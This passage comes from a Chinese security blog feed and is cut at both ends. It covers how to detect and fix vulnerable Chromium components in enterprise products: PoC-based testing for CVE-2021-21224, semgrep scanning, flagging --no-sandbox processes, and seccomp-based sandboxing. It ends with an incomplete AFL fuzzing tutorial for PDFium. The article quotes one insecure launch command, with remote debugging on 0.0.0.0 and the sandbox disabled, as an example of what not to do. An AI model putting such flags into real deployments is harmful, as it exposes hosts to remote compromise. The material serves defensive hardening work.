issue的短链，虽然通常该 issue 限制访问，但是仍可以通过 Gerrit 了解相关 issue的具体修复代码，安全研究者可以根据这些修复代码对该问题进行分析，进而推测出漏洞复现代码。</p><p>难怪 Twitter 上某位研究员会说：“如果 0-Day 有 Chromium Bug Tracker的编号，那它就不算 0-Day 了”。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/17.png" /></p><h3 id="风险评估">风险评估</h3><p>通常，在 Chromium官方披露漏洞或外部已出现在野利用的案例后，应进行风险评估，主要聚两个问题：</p><ul><li>公司内哪些产品受漏洞影响？</li><li>外部披露的 exp 是否能真实利用形成危害？</li></ul><p>在获悉一个漏洞的存在后，安全人员需要评估漏洞对公司的影响如何。通常一个可利用的漏洞在披露后会马上有安全人员写出exploit，而公开的 exploit 将导致利用门槛的大幅降低。</p><p>因此，常常需要监控公开信息渠道的 exploit 信息，例如：监控Github、Twitter 等平台的消息。但是早在 exploit 披露前，就可以通过Chromium Monorail 系统中的 issues、代码 CL或者更新日志提前了解风险。</p><p>一个漏洞的影响评估流程可以按下面几步走：</p><p><strong>step 1</strong></p><p>确定存在漏洞组件为哪个部分。</p><p><strong>step 2</strong></p><p>采集使用了该组件的产品（包括：使用了嵌入式浏览器的客户端、单纯使用 v8引擎等组件的软件、使用了 chrome headless 的服务端程序）；</p><p>有些产品仅使用 chrome 的一部分组件可能不受影响。例如：v8就会影响所有用 Chromium 内核的产品，但 iOS 客户端如果用JavaScriptCore，则不受影响。</p><p><strong>step 3</strong></p><p>确认使用存在漏洞组件的产品使用的版本是否受影响，如果产品本身对chromium 进行定制化开发的情况下，难以根据版本确定，可以通过PoC（部分场景下，可借助 Chromium项目中的单元测试用例）进行黑盒测试或者白盒审计受影响代码是否存在，是否存在漏洞的触发路径。</p><p><strong>step 4</strong></p><p>原则上内存破坏类的漏洞在没有 exploit公开的情况下也需要尽快修复，存在公开 exploit的情况下，需要立即修复；有时候 exploit 使用到的 exploit技术可能仅适用于某些版本的 chromium，但是并不代表这些版本之外的 chromium完全没有利用的可能。</p><p>例如使用 WebAssembly 创建 RWX pages 来写入 shellcode的技术在客户端使用的 chromium 版本不支持，但依旧存在通过 ROP等技术来到达 RCE 的可能性。</p><h3 id="风险检测">风险检测</h3><h4 id="黑盒测试">黑盒测试</h4><p>V8 等组件会编写单元测试 js文件，可以基于此修改形成页面，来通过黑盒的方式判断组件是否受对应漏洞影响。对于漏洞测试来说，这个资源也是极好的TestCase。</p><p>以 CVE-2021-21224 为例，编写黑盒测试用例过程如下：</p><p><strong>step 1</strong></p><p>通过 Issue 编号定位到对应的 Chromium Gerrit 工单</p><p><a href="https://chromium-review.googlesource.com/c/v8/v8/+/2838235"class="uri">https://chromium-review.googlesource.com/c/v8/v8/+/2838235</a></p><p><strong>step 2</strong></p><p>定位到官方提供的、针对该漏洞的单元测试文件</p><p><ahref="https://chromium-review.googlesource.com/c/v8/v8/+/2838235/4/test/mjsunit/compiler/regress-1195777.js"class="uri">https://chromium-review.googlesource.com/c/v8/v8/+/2838235/4/test/mjsunit/compiler/regress-1195777.js</a></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/18.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/19.png" /></p><p><strong>step 3 基于单元测试文件修改生成黑盒测试用例</strong></p><p>如果仔细观察，会发现上述单元测试代码中包含 % 开头的函数。它们是 v8引擎内置的 runtime 函数，用于触发 v8 引擎的某些功能特性，需要在 v8 的debug 版本 d8 命令行工具启动时，追加 –allow-natives-syntax参数才会生效。</p><p>因此，直接将上述单元测试 js来测试是无法准确测出是否存在漏洞的。但可以通过编写 js代码，实现相同的效果，例如：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/20.png" /></p><p>值得一提的是，前述漏洞的单元测试用例并不会造成浏览器 tab崩溃，而只是输出的数值与预期不符。因此，可以看到上述单元测试用例中引入了assertTrue、assertEquals等断言方法，用于判断单元测试数值是否与预期相等。</p><p>如果不等，则认为存在漏洞。在进行改造时，也要一并用自己的 JavaScript代码替换。最终，前述官方提供的测试用例可改造如下：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/21.png" /></p><p><strong>step 4</strong></p><p>最终效果如下</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/22.png" /></p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/23.png" /></p><h4 id="静态代码扫描">静态代码扫描</h4><p>如上面所述，由于 Chrome 漏洞即便在没有正式发布安全公告前，就已经有Issue ID，且能通过 Gerrit平台找到涉及的代码变动。因此，开发人员可以抢先在公司内部代码仓库进行全局静态代码扫描并修复问题。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/24.png" /></p><p><strong>1. 收集包含 chromium 组件的仓库</strong></p><p>不同的项目可能会引入 Chromium整体或部分相关的组件，通常可结合文件名、或特定的代码片段，在公司的代码仓库中收集包含相关指纹的仓库。</p><p><strong>2. 精确判断某个 Issue 对应的代码是否已修复</strong></p><p>以要精准扫描全局代码仓库中是否存在涉及 v8 组件的 CVE-2021-21224的漏洞代码为例。可基于 semgrep类方案，对公司代码仓库进行全局检查，编写静态代码扫描步骤如下：</p><ol type="1"><li><p>根据 Issue 号找到对应的漏洞修复代码变动<br /><a href="https://chromium-review.googlesource.com/c/v8/v8/+/2838235"class="uri">https://chromium-review.googlesource.com/c/v8/v8/+/2838235</a><br /><ahref="https://chromium-review.googlesource.com/c/v8/v8/+/2838235/4/src/compiler/representation-change.cc"class="uri">https://chromium-review.googlesource.com/c/v8/v8/+/2838235/4/src/compiler/representation-change.cc</a></p></li><li><p>确定涉及文件 representation-change.cc，存在漏洞的代码特征为 <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/25.png" /></p></li><li><p>可编写 semgrep 规则如下 <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/26.png" /></p></li><li><p>调用命令扫描 <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/27.png" /></p></li><li><p>最终效果如下 <img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/28.png" /></p></li></ol><h4 id="主机agent采集">主机Agent采集</h4><p>针对部署在服务器端、且使用了Chromium的程序，除了上述方法之外，可以考虑借助HIDS、EDR或RASP等系统采集进程特征，排查存在风险的实例。</p><p>同时满足下面两个条件的cmdline，其进程我们就可以认为是存在风险的：</p><ul><li>程序名包含 Chrome 或 Chromium</li><li>且 Cmdline 中包含 –no-sandbox 参数或 –disable-setuid-sandbox</li></ul><p><strong>1) 关于误报</strong></p><p>这里大家可能会产生疑问，这里为什么单独检测 Sandbox的开启与关闭就判断风险呢？</p><p>若Chromium组件已经使用最新发布的commit编译而成，包含了所有的漏洞补丁，也一样不会受到1Day和NDay漏洞的影响。</p><p>其实，这里主要考虑到Chrome在对漏洞修复是十分频繁的，持续的升级存在一定的维护成本，且不排除攻击者拥有Chromium0Day的可能。相较之下，逃逸Sandbox以控制浏览器所在的主机，是比较困难的；所以要求线上业务，尽可能开启Chromium Sandbox特性。</p><p><strong>2) 关于漏报</strong></p><p>另外，以上方案若 Chrome可执行文件被修改了文件名，则容易产生漏报。另一种可选的方案是：提取出多个Chrome 的特有选项进行过滤。例如，headless 浏览器启动时一般不会导航至特定url，此时命令行会存在 about:blank，再用 Chrome特定的区别于其他浏览器的选项进行排除。</p><p>更复杂的方案可以提取出 Chrome 执行文件的文件特征，或者建立 Chrome执行文件的 hashsum 数据库来判断进程的执行文件是否是 Chrome浏览器，进而再筛选启动时用了不安全配置的进程。</p><p>其实，我们在大规模观察相关的进程数据和运营之后，发现利用 –no-sandbox单个因素进行进程数据分析并获取未开启 Sandbox 的 Chromium进程，这样简单粗暴的做法并不会产生太多误报；有些进程看似非 Chromium浏览器，但其实也集成了 Chromium 并使用 no-sandbox 参数。</p><h2 id="风险修复">风险修复</h2><h3 id="通用修复方案">通用修复方案</h3><p>无论是客户端还是服务端，为了解决 Chrome 漏洞的远程命令执行风险，启用Chrome Sandbox，去除启动 Chrome 组件时的 –no-sandbox参数都是必须推进的安全实践。</p><p>如果客户端程序直接使用了 Chrome的最新版本，且未进行过于复杂的二次开发和迁移，没有历史包袱的话，在客户端里开启Chrome Sandbox，其实就是使用 Chrome组件的默认安全设计，障碍是比较小的。</p><p>此处根据不同场景和需求，存在三种不同的修复方案：</p><p><strong>方案 1. 启用 Sandbox</strong></p><p>1.启动 Chrome 时切勿使用 –no-sandbox 参数，错误的例子如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./bin/chrome --remote-debugging-address=0.0.0.0 --remote-debugging-port=9222 --disable-setuid-sandbox --no-sandbox<br></code></pre></td></tr></table></figure><p>2.使用普通用户而非 root 用户启动 chrome headless 进程</p><p><strong>方案 2. 更新 Chromium内核版本（后续维护成本极高）</strong></p><p>下载 <a href="https://download-chromium.appspot.com/"class="uri">https://download-chromium.appspot.com/</a>中的最新版本进行更新，并在后续迭代中持续升级到最新版</p><blockquote><p>Chromium 的最新版本会编译最新的 MR 和 Commit，因此也会修复 Chrome未修复的 0.5Day 漏洞，下载链接包含了所有的操作系统的 Chromium ， 例如Linux 可访问 <ahref="https://download-chromium.appspot.com/?platform=Linux_x64&amp;type=snapshots"class="uri">https://download-chromium.appspot.com/?platform=Linux_x64&amp;type=snapshots</a>下载。</p></blockquote><p>请注意，如果不希望相似的安全风险如之前的 Fastjson那样需要反复跟进并且高频推动业务修复，强烈建议安全团队推动业务参考方案一开启Sandbox，方案二可以当成短期方案规避当前风险。</p><p>经统计，2010 年至今 Google 共对外公开 Chromium 高危漏洞 1800多个；Chromium 的漏洞修复十分频繁，若不开启Sandbox，需持续更新最新版本。</p><p>若要启用 Sandbox，需要解决一定的依赖：首先，Chrome 的 Sandbox技术依赖于 Linux 内核版本，低版本的内核无法使用。各 Sandbox 技术 Linux内核依赖可参考下图</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/29.png" /></p><blockquote><p>图片来源 官方文档 <ahref="https://chromium.googlesource.com/chromium/src/+/master/docs/linux/sandboxing.md#sandbox-types-summary"class="uri">https://chromium.googlesource.com/chromium/src/+/master/docs/linux/sandboxing.md#sandbox-types-summary</a></p></blockquote><p>Chrome 运行时会寻找 chrome-sandbox 文件，一般下载 Chrome 的 Release时，Chrome 程序目录下都包含了 Sandbox 程序，若无法寻找到 chrome-sandbox文件可能会产生下述 Error 信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs log">_[0418/214027.785590:FATAL:__zygote_host_impl_linux.cc__(116)] No usable sandbox! Update your kernel or see_ <br><br>_https://chromium.googlesource.com/chromium/src/+/master/docs/linux/suid_sandbox_development.md_ _for more information on developing with the SUID sandbox. If you want to live dangerously and need an immediate workaround, you can try using --no-sandbox._  <br></code></pre></td></tr></table></figure><p>可参考以下链接进行配置</p><p><ahref="https://github.com/puppeteer/puppeteer/blob/main/docs/troubleshooting.md#alternative-setup-setuid-sandbox"class="uri">https://github.com/puppeteer/puppeteer/blob/main/docs/troubleshooting.md#alternative-setup-setuid-sandbox</a></p><p>若服务器的 Chrome 目录下包含了 chrome-sandbox文件，则可以直接修改配置运行，若不包含，可前往 <ahref="https://download-chromium.appspot.com/"class="uri">https://download-chromium.appspot.com/</a> 下载对应版本的chrome-sandbox 文件使用。</p><ul><li>注：Chrome 可执行文件的同一目录内包含 chrome-sandbox程序，则无需手动设置 CHROME_DEVEL_SANDBOX 环境变量</li></ul><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/33.png" /></p><p><strong>方案 3. 客户端选择系统默认浏览器打开外链 URL</strong></p><p>另外一个更加合适合理的设计是尽量避免使用应用内置的浏览器打开开放性URL 页面。我们应该尽量使用系统的浏览器去打开非公司域名的 URL链接（同时应该注意公司域名下的 URL 跳转风险）；把打开 URL的能力和场景交还给系统浏览器或专门的浏览器应用；保障应用内加载的资源都是可控的。</p><p>此方案同样适用于：客户端内置的 Chromium Webview组件短时间内无法随系统快速更新，且由于历史包袱无法 Webview组件无法开启沙箱。</p><p>此时，在客户端引入一个 “降级”逻辑，将不可信的页面跳转交给系统默认的浏览器打开。由于系统默认的浏览器通常默认是打开沙箱的，因此不失为一种“缓兵之计”。</p><h3id="云原生时代下针对-chrome-组件容器化的风险修复指引">云原生时代下，针对Chrome 组件容器化的风险修复指引</h3><p>业界云原生实践的发展非常迅速，企业应用容器化、组件容器化的脚步也势不可挡。从当前的Kubernetes 应用设计的角度出发，Chrome Headless组件在逻辑上是非常适用于无状态应用的设计的，所以 Chrome组件在容器化的进程也比较快。也因此，在 HIDS 进程大盘中， 启用–no-sandbox 的 Chrome headless 进程也一直在持续增多。</p><p>如果 Chrome 浏览器组件已经实现了容器化，那么您想使用 Chrome sandbox肯定会遇到各种麻烦；网络上有很多不完全安全的建议和文档，请尽量不要给容器添加privileged 权限和 SYS_ADMIN 权限，这将可能引入新的风险，详情可参考 TSRC之前的文章《<ahref="http://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&amp;mid=2651203843&amp;idx=1&amp;sn=bfea59631468fefcec5559dc3e877483&amp;chksm=bd2ccca58a5b45b3cae31e9839734710681017b5ff86f4dfc47f75ef2bd8ada52812d4ea7565&amp;scene=21#wechat_redirect">红蓝对抗中的云原生漏洞挖掘及利用实录</a>》。</p><p>我们应该尽量使用例如 –security-opt的方案对容器权限进行可控范围内的限制，构建一个 Seccomp白名单用于更安全的支持容器场景，这是一个足够优雅且较为通用的方式。如果企业已经践行了K8s 容器集群安全管理的规范和能力，在集群内新建带有 privileged 权限或SYS_ADMIN 权限的应用容器是会被集群管理员明确拒绝的，Seccomp是一个安全且可管理的方案。</p><p>你可以参考下述方式启动一个带有 seccomp 配置的容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --security-opt seccomp:./chrome.json chrome-sandbox-hub-image-near --headless --dump-dom https://github.com/neargle<br></code></pre></td></tr></table></figure><p>实际上 seccomp 配置文件规定了一个可管理的 syscall白名单，我们的配置文件就是需要把 Sandbox所需的系统权限用白名单方式赋予给容器，使得容器可以调用多个原本默认禁止的syscall。可以使用下列命令来检测当前的操作系统是否支持 seccomp:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep CONFIG_SECCOMP= /boot/config-$(<span class="hljs-built_in">uname</span> -r)<br>CONFIG_SECCOMP=y<br></code></pre></td></tr></table></figure><p>如果你的容器使用 K8s 进行部署，那你可以在spec.securityContext.seccompProfile 中配置上述 chrome.json 文件。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/30.png" /></p><p>通过白名单设置 Chrome 所需的 syscall以最小化容器权限，避免容器逃逸的风险，同时也符合多租户容器集群的安全设计，是一个推荐的方案；设置Seccomp 后，容器内可正常启用 chrome-sandbox，如下图。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/31.png" /></p><p>根据在 HIDS 收集到的资产和内部操作系统的特性，可以利用 strace工具很容易收集到启动 Sandbox 所需的 SysCall，并根据 SysCall 编写所需的seccomp 配置文件。</p><p>当然直接使用开源社区里现成的配置文件也能适用于绝大部分环境，著名前端测试工具lighthouse 所用的配置文件是一个非常不错的参考：</p><p><ahref="https://github.com/GoogleChrome/lighthouse-ci/blob/main/docs/recipes/docker-client/seccomp-chrome.json"class="uri">https://github.com/GoogleChrome/lighthouse-ci/blob/main/docs/recipes/docker-client/seccomp-chrome.json</a></p><h1 id="总结">总结</h1><p>随着 Chromium在企业各场景下的广泛应用，需要针对性地设置风险例行检测及应急响应方案，涉及的风险与应用场景、检查及修复方式，可概括如下：</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/Chromium组件风险剖析与收敛/32.png" /></p><p>除 Chromium 外，企业开发时也不乏会涉及到 Safari、Firefox等其他浏览器类组件的场景，在进行风险排查和响应时可借鉴类似的思路。</p><h2 id="参考及引用">参考及引用</h2><p>[1] Linux Sandboxing</p><p><ahref="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/linux/sandboxing.md"class="uri">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/linux/sandboxing.md</a></p><p>[2] The Security Architecture of the Chromium Browser</p><p><ahref="https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf"class="uri">https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf</a></p><p>[3] My Take on Chrome Sandbox Escape Exploit Chain</p><p><ahref="https://medium.com/swlh/my-take-on-chrome-sandbox-escape-exploit-chain-dbf5a616eec5"class="uri">https://medium.com/swlh/my-take-on-chrome-sandbox-escape-exploit-chain-dbf5a616eec5</a></p><p>[4] Linux SUID Sandbox</p><p><ahref="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/linux/suid_sandbox.md"class="uri">https://chromium.googlesource.com/chromium/src/+/HEAD/docs/linux/suid_sandbox.md</a></p><p>[5] How Blink Works</p><p><ahref="https://docs.google.com/document/d/1aitSOucL0VHZa9Z2vbRJSyAIsAz24kX8LFByQ5xQnUg/edit"class="uri">https://docs.google.com/document/d/1aitSOucL0VHZa9Z2vbRJSyAIsAz24kX8LFByQ5xQnUg/edit</a></p><p>[6] Chrome 浏览器引擎 Blink &amp; V8</p><p><a href="https://zhuanlan.zhihu.com/p/279920830"class="uri">https://zhuanlan.zhihu.com/p/279920830</a></p><p>[7] Blink-in-JavaScript</p><p><ahref="https://docs.google.com/presentation/d/1XvZdAF29Fgn19GCjDhHhlsECJAfOR49tpUFWrbtQAwU/htmlpresent"class="uri">https://docs.google.com/presentation/d/1XvZdAF29Fgn19GCjDhHhlsECJAfOR49tpUFWrbtQAwU/htmlpresent</a></p><p>[8] core/script: How a Script Element Works in Blink</p><p><ahref="https://docs.google.com/presentation/d/1H-1U9LmCghOmviw0nYE_SP_r49-bU42SkViBn539-vg/edit#slide=id.gc6f73"class="uri">https://docs.google.com/presentation/d/1H-1U9LmCghOmviw0nYE_SP_r49-bU42SkViBn539-vg/edit#slide=id.gc6f73</a></p><p>[9] [TPSA21-12] 关于 Chrome 存在安全问题可能影响 Windows版本微信的通告</p><p><a href="https://security.tencent.com/index.php/announcement/msg/230"class="uri">https://security.tencent.com/index.php/announcement/msg/230</a></p><p>[10] Hacking Team Android Browser Exploit 代码分析</p><p><a href="https://security.tencent.com/index.php/blog/msg/87"class="uri">https://security.tencent.com/index.php/blog/msg/87</a></p><p>[11] <ahref="http://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&amp;mid=2651199191&amp;idx=1&amp;sn=d8fa6b5293cc7cac5b5f6670208abdfd&amp;chksm=bd2cf3718a5b7a67bb7bdb9868ff38afea817fdecdd6b412214f4ea014d237fe44ef0f39cfbe&amp;scene=21#wechat_redirect">物联网安全系列之远程破解Google Home</a></p><p>[12] <ahref="http://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&amp;mid=200919898&amp;idx=1&amp;sn=f5e68ad28cee0c067515cb50960c5953&amp;chksm=28d32efc1fa4a7eace5302ada45070ee0e5f41a7598b8b3aee83ce63fcc38652a96bf94629c4&amp;scene=21#wechat_redirect">AndroidWebview UXSS 漏洞攻防</a></p>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Chromium</tag>
      
      <tag>v8</tag>
      
      <tag>Risk Analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用AFL fuzz PDFium</title>
    <link href="/2021/07/03/Use-AFL-fuzz-pdfium/"/>
    <url>/2021/07/03/Use-AFL-fuzz-pdfium/</url>
    
    <content type="html"><![CDATA[<h1 id="下载源码">下载源码</h1><p>安装depot-tools后下载源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装depot-tools</span><br>git <span class="hljs-built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git<br><span class="hljs-built_in">export</span> PATH=`<span class="hljs-built_in">pwd</span>`/depot_tools:<span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>&quot;</span><br><span class="hljs-comment"># 下载pdfium</span><br><span class="hljs-built_in">mkdir</span> repo<br><span class="hljs-built_in">cd</span> repo<br>gclient config --unmanaged https://pdfium.googlesource.com/pdfium.git<br>gclient <span class="hljs-built_in">sync</span><br><span class="hljs-built_in">cd</span> pdfium<br></code></pre></td></tr></table></figure><h1 id="编译">编译</h1><p>ubuntu 或者 Debian 系统可直接使用<code>./build/install-build-deps.sh</code>安装依赖（不是的可以加上<code>--unsupported</code>试试，或者手动配置依赖），利用<code>gn args out/afl</code>生成编译参数文件，参考如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">is_debug</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">pdf_use_skia</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">pdf_use_skia_paths</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-attr">pdf_enable_xfa</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">pdf_enable_v8</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">pdf_is_standalone</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">is_component_build</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">v8_static_library</span> = <span class="hljs-literal">true</span><br><br><span class="hljs-attr">clang_use_chrome_plugins</span> = <span class="hljs-literal">false</span><br><span class="hljs-attr">use_sysroot</span> = <span class="hljs-literal">false</span><br><br><span class="hljs-attr">use_afl</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">is_asan</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">is_lsan</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">optimize_for_fuzzing</span> = <span class="hljs-literal">true</span><br><span class="hljs-attr">symbol_level</span>=<span class="hljs-number">2</span><br><br><span class="hljs-attr">dcheck_always_on</span> = <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><blockquote><p>pdfium 源码仓库中没有afl-fuzz的代码，需要自己下载，当然也可以使用自己魔改过的afl（默认版本为2.52b，推荐使用2.57b)<br /><code>https://chromium.googlesource.com/chromium/src/third_party/+/master/afl/</code></p></blockquote><p>使用 <code>ninja -C out/afl</code>编译全部文件，或者使用<code>ninja -C out/afl &lt;test target&gt;</code>编译自己想fuzz的目标。</p><h1 id="开始fuzz">开始Fuzz</h1><p>afl-fuzz 的使用和其他项目一样。初始的种子文件有几个地方可以获取：</p><ul><li><ahref="https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/"class="uri">https://pdfium.googlesource.com/pdfium/+/refs/heads/master/testing/resources/</a></li><li><a href="https://github.com/mozilla/pdf.js/tree/master/test/pdfs"class="uri">https://github.com/mozilla/pdf.js/tree/master/test/pdfs</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./afl-fuzz -M 01 -m none -t 30000 -i /home/fuzz/input -o /home/fuzz/out -x /home/fuzz/pdf.dict -- ./pdfium_test @@<br></code></pre></td></tr></table></figure><h1 id="libjpeg-turbo编译与fuzz">libjpeg-turbo编译与fuzz</h1><blockquote><p><code>https://github.com/libjpeg-turbo/libjpeg-turbo</code></p></blockquote><p><code>libjpeg-turbo</code>是pdfium中默认的JPEG编解码器</p><p>AFL插桩编译：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir build &amp;&amp; cd build &amp;&amp; cmake -DCMAKE_C_COMPILER=afl-clang-fast -DCMAKE_C_FLAGS=&quot;-g -fsanitize=address&quot; ..<br>CC=afl-clang-fast CXX=afl-clang-fast++ AFL_USE_ASAN=1 make<br></code></pre></td></tr></table></figure><p>以<code>cjpeg</code>为例选择目标进行fuzz：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz -M 1 -i ../seed-corpora/afl-testcases/bmp/ -o fuzzout -m none -t 60000  -x ~/AFLplusplus/dictionaries/bmp.dict  -- ./cjpeg-static -quality 95 -dct float -rgb -optimize  -outfile ./1.jpg @@<br></code></pre></td></tr></table></figure><h1 id="代码覆盖率测试">代码覆盖率测试</h1><blockquote><p><code>https://github.com/vanhauser-thc/afl-cov</code></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cmake  -DCMAKE_C_FLAGS=&quot;-g -fprofile-arcs -ftest-coverage&quot; -DCMAKE_CXX_FLAGS=&quot;-g  -fprofile-arcs -ftest-coverage&quot; ..<br>make -j8<br><br>~/afl-cov/afl-cov -d ../build/jpegout/ --live --coverage-cmd &quot;./jpegtran-static -progess AFL_FILE&quot; --code-dir . --enable-branch-coverage --overwrite<br></code></pre></td></tr></table></figure><h1 id="google-project与aflplusplus的适配">Googleproject与AFLplusplus的适配</h1><p>修改<code>pdfium/third_party/afl/BUILD.gn</code>,将编译好的AFLplusplus文件夹拷贝到src中，重命名afl-cc为afl-clang和afl-clang++</p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 